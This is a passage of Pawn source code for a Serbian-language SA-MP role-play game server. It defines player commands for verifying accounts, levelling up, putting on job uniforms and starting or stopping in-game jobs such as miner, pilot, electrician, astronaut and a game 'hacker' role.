//         if( TipVozila[ vehicleid ] == ORGANIZACIJSKO_VOZILO && OrgaVozila[ vehicleid ] == PlayerInfo[ playerid ][ xClan ] ) {
// 			format( globalstring, sizeof( globalstring ), "Taksist %s vam je ponudio taxi voznju.\n\nPrihvacate li voznju?", ImeIgraca( playerid ) );
// 			SPD( izbor, dialog_TAXIOFFER, DSMSG, "Ponuda taxi voznje", globalstring, "Prihvacam", "Odbijam");

// 			SendJobMessage( playerid, "Ponudio si voznju igracu {36AB00}%s"col_white".", ImeIgraca( izbor ) );

// 			offeredByCabbie[ izbor ] = playerid;
// 		} else SendErrorMessage( playerid, "Morate biti u vozilu taksiste." );
// 	    return 1;
//  	}
//  	else if( strcmp( item, "uzmiklijenta",true) == 0) {
//  	    new Float:playerPos[ 3 ];
						
//  	    if( sscanf( params, "s[32]u", item, izbor ) ) {
// 			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
// 			SendUsageMessage( playerid, "/taxi uzmiklijenta [ ID/Deo imena ] ");
// 			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
// 			return 1;
// 		}
//   		if( playerid == izbor ) return SendErrorMessage( playerid, "Ne mozes voziti sam sebe!");
//   		if( izbor == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
// 		if( !PozvaoTaxi[ izbor ] ) return SendErrorMessage( playerid, "Taj igrac nije pozvao taxi!");
//         if( taxiDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Morate biti na duznosti." );
// 		if( VoziIgracaID[ playerid ] != INVALID_PLAYER_ID ) return SendErrorMessage( playerid, "Vec vozis nekog!");
//         if( TipVozila[ vehicleid ] == ORGANIZACIJSKO_VOZILO && OrgaVozila[ vehicleid ] == PlayerInfo[ playerid ][ xClan ] ) {
// 	        PozvaoTaxi[ izbor ] = false;

// 			SendJobMessage( playerid, "Prihvatio si poziv igraca {36AB00}%s "col_white"kome je potreban taxista, lokacija igraca:{36AB00} %sFFFFFF!", ImeIgraca( izbor ), GetPlayerLocation( izbor ) );

// 			GetPlayerPos( izbor, playerPos[ 0 ], playerPos[ 1 ], playerPos[ 2 ] );
// 			Novi_SetPlayerCheckpoint( playerid, playerPos[ 0 ], playerPos[ 1 ], playerPos[ 2 ], 3.0 );
// 			CheckpointStatus[ playerid ] = 12;

// 			foreach( Player, i )
// 			{
// 				if( GetFactionType( i ) == ORG_TIP_TAXI && taxiDuty[ i ] == true )
// 					SendClientMessageEx(i, -1, "%s {FBE600}je prihvatio klijenta"col_white" %s.", ImeIgraca( playerid ), ImeIgraca( izbor ) );
// 			}
// 		} else SendErrorMessage( playerid, "Morate biti u vozilu taksiste." );
// 		return 1;
//  	}
//  	else  {
// 		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
// 		SendUsageMessage( playerid, "/taxi [ opcija ]");
//      	SCM( playerid, BELA, "[Opcije] duty, ponudivoznju, uzmiklijenta");
// 		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
// 	}
// 	return 1;
// }

CMD:vf( playerid, params[] ) {
    if( GetFactionType( playerid ) == ORG_TIP_PD && PoliceDuty[ playerid ]) {
		SendErrorMessage( playerid, "PD/FBI/CIA ne moze da radi poslove na duznosti!");
		return 1;
	}
	
	if( ( PlayerInfo[ playerid ][ xAdmin ] > 0 && PlayerInfo[ playerid ][ xAdmin ] < 7 ) || PlayerInfo[ playerid ][ xSupporter ] > 0 ) {
        SendErrorMessage( playerid, "Admin TEAM i Helperi ne mogu da rade poslove." );
		return 1;
	}
	
    if( PlayerInfo[ playerid ][ xPosao ] == 0 ) return SendErrorMessage( playerid, "Ovu komandu moze koristiti samo onaj ko je zaposljen." );

	new broj = ( random( 800 ) + 100 );
	PlayerCode[ playerid ] = broj;
	format( globalstring, sizeof( globalstring ), "Unesite u prazno polje ovaj kod: %d", broj );
	SPD( playerid, dialog_VERIFIKACIJA, DSI, D_NASLOV, globalstring, D_ODABERI, D_ODUSTANI );
    return 1;
}

CMD:levelup( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xLevel ] >= 1 ) {

		new nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1;
		new expamount = nxtlevel*levelexp;
		if( PlayerInfo[ playerid ][ xRespekt ] < expamount ) {
			SendErrorMessage( playerid, "Trebas imati %d Respekta, a ti trenutno imas [%d] !", expamount, PlayerInfo[ playerid ][ xRespekt ] );
			return 1;
		}
		else {
			format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
			GameTextForPlayer( playerid, globalstring, 5000, 1);
			PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			PlayerPlayMusic( playerid );
			PlayerInfo[ playerid ][ xLevel ]++;
			SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
			
			PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
            PlayerInfo[ playerid ][ xRespekt ] = 0; // ..
            SavePlayer( playerid );
			format( globalstring, sizeof( globalstring ), "   Kupio si Level %d!", nxtlevel);
			SCM( playerid, SVETLOPLAVA, globalstring);

            dajSkillPoen(playerid, 1);
		}
	}
	return 1;
}

CMD:uniforma( playerid, params[] ) {
    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes da uzmes opremu dok si u vozilu." );

	if( PlayerInfo[ playerid ][ xPosao ] == POSAO_KOSAC ) {
		if( !IsPlayerInRangeOfPoint( playerid, 3.0, jobsInfos[POSAO_KOSAC][jUniforma][0], jobsInfos[POSAO_KOSAC][jUniforma][1], jobsInfos[POSAO_KOSAC][jUniforma][2] ) ) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
			UzeoOpremu[ playerid ] = true;
			if( PlayerInfo[ playerid ][ xPol ] == 1 ) PostaviSkin( playerid, 202 );
			else if( PlayerInfo[ playerid ][ xPol ] == 2 ) PostaviSkin( playerid, 69 );
			else PostaviSkin( playerid, 202 );
			
			SendJobMessage( playerid, "Uzeli ste opremu sada mozete kositi travu!(/posao)" );
		}
		else if( UzeoOpremu[ playerid ] == true ) {
		    UzeoOpremu[ playerid ] = false;
		    PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
   			
		    SendJobMessage( playerid, "Skinuli ste opremu kosaca trave." );
		}
	}
	else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR ) {
		if( !IsPlayerInRangeOfPoint( playerid, 3.0, jobsInfos[POSAO_RUDAR][jUniforma][0], jobsInfos[POSAO_RUDAR][jUniforma][1], jobsInfos[POSAO_RUDAR][jUniforma][2] ) ) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
            if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_LHAND ) ) return SendErrorMessage( playerid, "Vec imas neki objekt u lijevoj ruci!");
            
			UzeoOpremu[ playerid ] = true;
			PostaviSkin( playerid, 260 );

			
			SetPlayerAttachedObject( playerid, OBJECT_SLOT_LHAND, 18634, 6, 0.048513, 0.018571, 0.028653, 314.764404, 226.953979, 222.510803, 1.000000, 1.000000, 1.000000 );
	        SetPlayerAttachedObject( playerid, OBJECT_NOSI, 2060, 1, -0.191781, -0.162666, -0.003734, 88.812377, 0.000000, 0.408470, 1.000000, 1.000000, 1.000000 );

			SendJobMessage( playerid, "Uzeli ste opremu sada mozete poceti sa poslom!(/posao)" );
		}
		else if( UzeoOpremu[ playerid ] == true ) {
		
		    if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_LHAND ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_LHAND );
		    if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_NOSI ) ) RemovePlayerAttachedObject( playerid, OBJECT_NOSI );
		    UzeoOpremu[ playerid ] = false;
		    PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
   			
		    SendJobMessage( playerid, "Skinuli ste opremu rudara." );
		}
	}

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_PORNO) 
    {
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, jobsInfos[POSAO_PORNO][jUniforma][0], jobsInfos[POSAO_PORNO][jUniforma][1], jobsInfos[POSAO_PORNO][jUniforma][2])) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
            UzeoOpremu[ playerid ] = true;
            PostaviSkin( playerid, 246 );
            SendJobMessage( playerid, "Uzeli ste opremu sada mozete poceti sa poslom! ( /posao )" );
        }
        else if( UzeoOpremu[playerid] == true)
        {
            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            SendJobMessage( playerid, "Skinuli ste opremu porno glumice." );
            UzeoOpremu[ playerid ] = false;
        }
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_LOVAC) 
    {
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, jobsInfos[POSAO_LOVAC][jUniforma][0], jobsInfos[POSAO_LOVAC][jUniforma][1], jobsInfos[POSAO_LOVAC][jUniforma][2])) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
            UzeoOpremu[ playerid ] = true;
            PostaviSkin( playerid, 161 );
            SendJobMessage( playerid, "Uzeli ste opremu sada mozete poceti sa poslom! ( /posao )" );
        }
        else if( UzeoOpremu[playerid] == true)
        {
            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            SendJobMessage( playerid, "Skinuli ste opremu lovca." );
            UzeoOpremu[ playerid ] = false;
        }
    }

	else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_SABOTAZER) 
    {
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, jobsInfos[POSAO_SABOTAZER][jUniforma][0], jobsInfos[POSAO_SABOTAZER][jUniforma][1], jobsInfos[POSAO_SABOTAZER][jUniforma][2])) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
            UzeoOpremu[ playerid ] = true;
            PostaviSkin( playerid, 153 );
            SendJobMessage( playerid, "Uzeli ste opremu sada mozete poceti sa poslom! ( /posao )" );
        }
        else if( UzeoOpremu[playerid] == true)
        {
            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            SendJobMessage( playerid, "Skinuli ste opremu sabotazera." );
            UzeoOpremu[ playerid ] = false;
        }
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_MOLER) 
    {
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, jobsInfos[POSAO_MOLER][jUniforma][0], jobsInfos[POSAO_MOLER][jUniforma][1], jobsInfos[POSAO_MOLER][jUniforma][2])) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
            UzeoOpremu[ playerid ] = true;
            PostaviSkin( playerid, 8 );
            RemovePlayerAttachedObject(playerid, OBJECT_SLOT_LHAND);
            SetPlayerAttachedObject(playerid, OBJECT_SLOT_LHAND, 19622, 6, 0.0719, 0.0039, -0.2590, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000, 0xFFFFFFFF, 0xFFFFFFFF);
            SendJobMessage( playerid, "Uzeli ste opremu sada mozete poceti sa poslom! ( /posao )" );
        }
        else if( UzeoOpremu[playerid] == true)
        {
            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            SendJobMessage( playerid, "Skinuli ste opremu molera." );
            if(IsPlayerAttachedObjectSlotUsed(playerid, OBJECT_SLOT_LHAND)) 
                RemovePlayerAttachedObject(playerid, OBJECT_SLOT_LHAND);
            UzeoOpremu[ playerid ] = false;
        }
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_HAKER) 
    {
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, jobsInfos[POSAO_HAKER][jUniforma][0], jobsInfos[POSAO_HAKER][jUniforma][1], jobsInfos[POSAO_HAKER][jUniforma][2])) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
            UzeoOpremu[ playerid ] = true;
            PostaviSkin( playerid, 17 );
            SendJobMessage( playerid, "Uzeli ste opremu sada mozete poceti sa poslom! ( /posao )" );
        }
        else if( UzeoOpremu[playerid] == true)
        {
            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            SendJobMessage( playerid, "Skinuli ste opremu hakera." );
            UzeoOpremu[ playerid ] = false;
        }
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_ASTRONAUT) 
    {
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, jobsInfos[POSAO_ASTRONAUT][jUniforma][0], jobsInfos[POSAO_ASTRONAUT][jUniforma][1], jobsInfos[POSAO_ASTRONAUT][jUniforma][2])) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
            UzeoOpremu[ playerid ] = true;
            PostaviSkin( playerid, 70 );

            if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_HEAD ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_HEAD );
            SetPlayerAttachedObject(playerid, OBJECT_SLOT_HEAD, 19159, 2, 0.009000, 0.009999, -0.001999, 12.500009, -100.799949, -6.399996, 1.000000, 1.000000, 1.000000);

            SendJobMessage( playerid, "Uzeli ste opremu sada mozete poceti sa poslom! ( /posao )" );
        }
        else if( UzeoOpremu[playerid] == true)
        {
            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_HEAD ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_HEAD );
            SendJobMessage( playerid, "Skinuli ste opremu astronauta." );
            UzeoOpremu[ playerid ] = false;
        }
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_DRVA) 
    {
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, jobsInfos[POSAO_DRVA][jUniforma][0], jobsInfos[POSAO_DRVA][jUniforma][1], jobsInfos[POSAO_DRVA][jUniforma][2])) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
            UzeoOpremu[ playerid ] = true;
            PostaviSkin( playerid, 135 );
            
            SendJobMessage( playerid, "Uzeli ste opremu sada mozete poceti sa poslom! ( /posao )" );
        }
        else if( UzeoOpremu[playerid] == true)
        {
            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            SendJobMessage( playerid, "Skinuli ste opremu prevoznik drva." );
            UzeoOpremu[ playerid ] = false;
        }
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_PILOT) 
    {
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, jobsInfos[POSAO_PILOT][jUniforma][0], jobsInfos[POSAO_PILOT][jUniforma][1], jobsInfos[POSAO_PILOT][jUniforma][2])) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
            UzeoOpremu[ playerid ] = true;
            PostaviSkin( playerid, 61 );
            
            SendJobMessage( playerid, "Uzeli ste opremu sada mozete poceti sa poslom! ( /posao )" );
        }
        else if( UzeoOpremu[playerid] == true)
        {
            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            SendJobMessage( playerid, "Skinuli ste opremu pilota." );
            UzeoOpremu[ playerid ] = false;
        }
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_ELEKTRIK) 
    {
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, jobsInfos[POSAO_ELEKTRIK][jUniforma][0], jobsInfos[POSAO_ELEKTRIK][jUniforma][1], jobsInfos[POSAO_ELEKTRIK][jUniforma][2])) return SendErrorMessage( playerid, "Niste na mestu uzimanja/skidanja opreme!" );
        if( UzeoOpremu[ playerid ] == false ) {
            UzeoOpremu[ playerid ] = true;
            PostaviSkin( playerid, 50 );
            
            SendJobMessage( playerid, "Uzeli ste opremu sada mozete poceti sa poslom! ( /posao )" );
        }
        else if( UzeoOpremu[playerid] == true)
        {
            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            SendJobMessage( playerid, "Skinuli ste opremu elektricara." );
            UzeoOpremu[ playerid ] = false;
        }
    }
	
	return 1;
}

CMD:prekiniposao( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xPosao ] == POSAO_KOSAC ) {
	    if( !KrenuoKosenje[ playerid ] ) return SendErrorMessage( playerid, "Niste poceli posao pa nemate sta da prekinete.");
		if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );

		PokosenaTrava[ playerid ] = 0;
		KrenuoKosenje[ playerid ] = false;

        DisablePlayerCheckpoint(playerid);

		Novi_DestroyVehicle(kosacVozilo[playerid]);
        kosacVozilo[playerid] = -1;
		TogglePlayerControllable( playerid, true );

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

		SendJobMessage( playerid, "Niste pokosili svu travu pa niste ni dobili nista novca." );
		return 1;
	}

    else if(PlayerInfo[playerid][xPosao] == POSAO_DRVA) {

        if(prevoziDrva[playerid] == 0) return SendErrorMessage(playerid, "Nisi zapoceo posao!");

        DisablePlayerCheckpoint(playerid);

        prevoziDrva[ playerid ] = 0;
        if(IsValidVehicle(posaoDrvaVozilo[playerid]))
            Novi_DestroyVehicle(posaoDrvaVozilo[playerid]);

        posaoDrvaVozilo[playerid] = -1;

        // if(IsValidDynamicObject(posaoDrvaObjekat[playerid]))
        //     DestroyDynamicObject(posaoDrvaObjekat[playerid]);

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        SendJobMessage( playerid, "Prekinuo si posao." );

        return 1;
    }

    else if(PlayerInfo[playerid][xPosao] == POSAO_PILOT) {

        if(radiPilot[playerid] == 0) return SendErrorMessage(playerid, "Nisi zapoceo posao!");

        DisablePlayerCheckpoint(playerid);

        radiPilot[ playerid ] = 0;
        if(IsValidVehicle(pilotVozilo[playerid]))
            Novi_DestroyVehicle(pilotVozilo[playerid]);

        pilotVozilo[playerid] = -1;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        SendJobMessage( playerid, "Prekinuo si posao." );

        return 1;
    }

    else if(PlayerInfo[playerid][xPosao] == POSAO_ELEKTRIK) {

        if(radiElektricar[playerid] == 0) return SendErrorMessage(playerid, "Nisi zapoceo posao!");

        DisablePlayerCheckpoint(playerid);

        radiElektricar[ playerid ] = 0;

        if(IsValidVehicle(elektricarVozilo[playerid]))
            Novi_DestroyVehicle(elektricarVozilo[playerid]);
        
        elektricarVozilo[playerid] = -1;
        
        elektricarTDShow(playerid, false);

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        SendJobMessage( playerid, "Prekinuo si posao." );

        return 1;
    }

    else if(PlayerInfo[playerid][xPosao] == POSAO_PORNO) {

        if(!radiPorno[playerid]) return SendErrorMessage(playerid, "Nisi zapoceo posao!");

        radiPorno[playerid] = false;
        pornoCooldown[playerid] = 60;
        pornoProgress[playerid] = 0.0;
        KrevetUpotreba = false;

        TogglePlayerControllable(playerid, 1);

        ClearAnimations(playerid);

        DestroyPlayerProgressBar(playerid, PornoBar[playerid]);
        PornoBar[playerid] = INVALID_PLAYER_BAR_ID;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        SendJobMessage( playerid, "Prekinuo si posao." );

        return 1;
    }


    else if(PlayerInfo[playerid][xPosao] == POSAO_LOVAC) {

        if(!radiLovac[playerid]) return SendErrorMessage(playerid, "Nisi zapoceo posao!");

        radiLovac[playerid] = false;
        lovacCounter[playerid] = 0;

        ResetAllWeapons(playerid);

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        SendJobMessage( playerid, "Prekinuo si posao." );

        return 1;
    }

    else if(PlayerInfo[playerid][xPosao] == POSAO_ASTRONAUT) {

        if(!radiAstronaut[playerid]) return SendErrorMessage(playerid, "Nisi zapoceo posao!");

        radiAstronaut[playerid] = false;
        astronautCP[playerid] = 0;

        Novi_DisablePlayerCheckpoint(playerid);

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        if(astronautTDShowed[playerid]) 
            astronautTDShow(playerid, false);
        astronautKey[playerid] = 0;
        astronautPopravkaBroj[playerid] = 0;

        if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_HEAD ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_HEAD );

        SetPlayerTime( playerid, ServerInfo[ VremeInGame ], 0 );
        SetPlayerWeather( playerid, 6 );

        PortajIgraca(playerid, 208.0606,1740.7100,17.6025);

        SendJobMessage( playerid, "Prekinuo si posao." );

        return 1;
    }

    else if(PlayerInfo[playerid][xPosao] == POSAO_HAKER) {

        if(playerHacking[playerid] == 0) return SendErrorMessage(playerid, "Nisi zapoceo posao!");

        playerHacking[playerid] = 0;
        playerHackingNosi[playerid] = false;

        Novi_DisablePlayerCheckpoint(playerid);

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        SendJobMessage( playerid, "Prekinuo si posao." );

        return 1;
    }

    else if(PlayerInfo[playerid][xPosao] == POSAO_DELIVERY) {

        if(!RadiDelivery[playerid]) return SendErrorMessage(playerid, "Ne radis posao!");

        Novi_DisablePlayerCheckpoint(playerid);
        DeliveryCP[playerid] = 0;
        RadiDelivery[playerid] = false;

        Novi_DestroyVehicle(DeliveryVozilo[playerid]);
        DeliveryVozilo[playerid] = -1;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        SendJobMessage( playerid, "Prekinuo si posao." );

        return 1;
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR ) {

        if( PosaoRudar[ playerid ] == 0 ) return SendErrorMessage( playerid, "Niste poceli sa poslom" );

        Novi_DisablePlayerCheckpoint(playerid);
        CheckpointStatus[ playerid ] = 0;
        PosaoRudar[ playerid ] = 0;
        rudarPosao[ playerid ][ rudarIskopano ] = 0;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        SendJobMessage( playerid, "Prekinuo si posao." );

        return 1;
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_SABOTAZER ) {
        if( !RadiSabotazer{playerid} ) return SendErrorMessage(playerid, "Nisi poceo sa poslom!");

        Novi_DisablePlayerCheckpoint(playerid);

        Novi_DestroyVehicle(SabotazerVozilo[playerid]);

        SabotazerPosloviCP{playerid} = 0;
        RadiSabotazer{playerid} = false;

        PricaSabotazerTimer{playerid} = 0;
        SabotazerVozilo[playerid] = 0;
        UbioKapetana2{playerid} = 0;
        UbioKapetana1{playerid} = 0;
        UpucaKapetana{playerid} = 0;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        SendJobMessage( playerid, "Prekinuo si posao." );
        return 1;
    }

    else if( PlayerInfo[ playerid ][ xPosao ] == POSAO_MOLER ) {

        if(!RadiMoler[playerid]) return SendErrorMessage(playerid, "Nisi poceo posao!");

        Novi_SetPlayerPos(playerid, -1685.6660,1035.8398,45.2109);
        SetPlayerVirtualWorld(playerid, 0);
        TogglePlayerControllable(playerid, false);
        ClearAnimations(playerid);
        defer UcitavanjeTimer(playerid);

        for(new obj = 0; obj < 8; obj++) {

            DestroyPlayerObject(playerid, MolerZid[obj][playerid]);
        }

        RadiMoler[playerid] = false;
        MolerCP[playerid] = 0;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        SendJobMessage( playerid, "Prekinuo si posao." );

        return 1;
    }

	return 1;
}

CMD:posao( playerid, params[], help ) {

    if( GetFactionType( playerid ) == ORG_TIP_PD && PoliceDuty[ playerid ]) {
		SendErrorMessage( playerid, "PD/FBI/CIA ne moze da radi poslove na duznosti!");
		return 1;
	}

    if( ( PlayerInfo[ playerid ][ xAdmin ] > 0 && PlayerInfo[ playerid ][ xAdmin ] < 7 ) || PlayerInfo[ playerid ][ xSupporter ] > 0 || PlayerInfo[playerid][xSpecAdmin] == 1) {

        new hours;
        gettime(hours);
        if(hours > 7 && hours < 24) return SendErrorMessage(playerid, "Admin Team, Helperi i Spec Admini mogu raditi samo od 00:00 do 07:00!");
	}

    if(PlayerInfo[playerid][xPosao] == POSAO_ELEKTRIK) {

        if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
        if(radiElektricar[playerid] >= 1) return SendErrorMessage(playerid, "Vec radis posao!");
        if(!IsPlayerInRangeOfPoint(playerid, 2.0, 1999.0894,-2015.2059,13.5750)) return SendErrorMessage(playerid, "Nisi na mestu!");
        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

        if(IsValidVehicle(elektricarVozilo[playerid]))
            Novi_DestroyVehicle(elektricarVozilo[playerid]);

        elektricarVozilo[playerid] = V01D_CreateVehicle(552,1999.0894,-2015.2059,13.5750,0.0, 0, 0, -1 );
        Novi_PutPlayerInVehicle(playerid, elektricarVozilo[playerid], 0);

        radiElektricar[playerid] = 1;

        Novi_DisablePlayerCheckpoint(playerid);
        Novi_SetPlayerCheckpoint(playerid, 941.9877,-1527.3007,13.5960, 2.0);



        SendJobMessage(playerid, "Idi u Electronic Shop da zapocnes popravku televizora!");

        return 1;
    }

    if(PlayerInfo[playerid][xPosao] == POSAO_PILOT) {

        if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
        if(radiPilot[playerid] >= 1) return SendErrorMessage(playerid, "Vec radis posao!");
        if(!IsPlayerInRangeOfPoint(playerid, 2.0, 3521.1870,-934.2792,11.1237)) return SendErrorMessage(playerid, "Nisi na aerodromu u Floridi!");
        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

        if(IsValidVehicle(pilotVozilo[playerid]))
            Novi_DestroyVehicle(pilotVozilo[playerid]);

        radiPilot[playerid] = 1;

        Novi_DisablePlayerCheckpoint(playerid);
        Novi_SetPlayerCheckpoint(playerid, 3532.7988,-928.5114,11.5829, 5.0);

        SendJobMessage(playerid, "Idi na checkpoint da uzmes avion!");

        return 1;
    }

    if(PlayerInfo[playerid][xPosao] == POSAO_DRVA) {

        if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
        if(prevoziDrva[playerid] >= 1) return SendErrorMessage(playerid, "Vec radis posao!");
        if(!IsPlayerInRangeOfPoint(playerid, 50.0, 1102.7148,-326.4423,73.9950)) return SendErrorMessage(playerid, "Moras biti u blizini posla!");
        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

        // if(IsValidDynamicObject(posaoDrvaObjekat[playerid]))
        //     DestroyDynamicObject(posaoDrvaObjekat[playerid]);

        if(IsValidVehicle(posaoDrvaVozilo[playerid]))
            Novi_DestroyVehicle(posaoDrvaVozilo[playerid]);

        prevoziDrva[playerid] = 1;

        Novi_DisablePlayerCheckpoint(playerid);
        Novi_SetPlayerCheckpoint(playerid, 1096.6359,-346.0647,74.0197, 5.0);

        SendJobMessage(playerid, "Idi na mesto utovara!");

        return 1;
    }

    if(PlayerInfo[playerid][xPosao] == POSAO_ASTRONAUT) {

        if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
        if(radiAstronaut[playerid]) return SendErrorMessage(playerid, "Vec radis posao!");
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, 208.0606,1740.7100,17.6025)) return SendErrorMessage(playerid, "Moras biti na rampi rakete!");
        if( AccountVerified[ playerid ] == false ) return SendErrorMessage( playerid, "Prvo morate verifikovati svoj nalog(/vf).");

        radiAstronaut[playerid] = true;
        astronautTDShowed[playerid] = false;
        astronautKey[playerid] = 0;
        astronautPopravkaBroj[playerid] = 0;

        TogglePlayerControllable(playerid, false);

        InterpolateCameraPos(playerid, 204.505142, 1735.872558, 19.856771, 150.072677, 1656.919067, 66.229492, 10000);
        InterpolateCameraLookAt(playerid, 206.495819, 1740.001464, 17.859426, 152.460723, 1661.034179, 64.692298, 10000);

        defer poletanjeRakete(playerid);

        SendJobMessage(playerid, "Sacekajte da raketa uzleti!");

        return 1;
    }

    if(PlayerInfo[playerid][xPosao] == POSAO_PORNO) {

        if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
        if(!IsPlayerInRangeOfPoint(playerid, 4.0, 794.8459,-1312.7743,710.3820)) return SendErrorMessage(playerid, "Nisi blizu kreveta u studiju!");
        if(KrevetUpotreba) return SendErrorMessage(playerid, "Snimanje je vec u toku! Sacekaj malo!");
        if(pornoCooldown[playerid] >= 1) return SendErrorMessage(playerid, "Moras sacekati jos %d sekundi!", pornoCooldown[playerid]);
        if(radiPorno[playerid]) return SendErrorMessage(playerid, "Vec radis posao!");
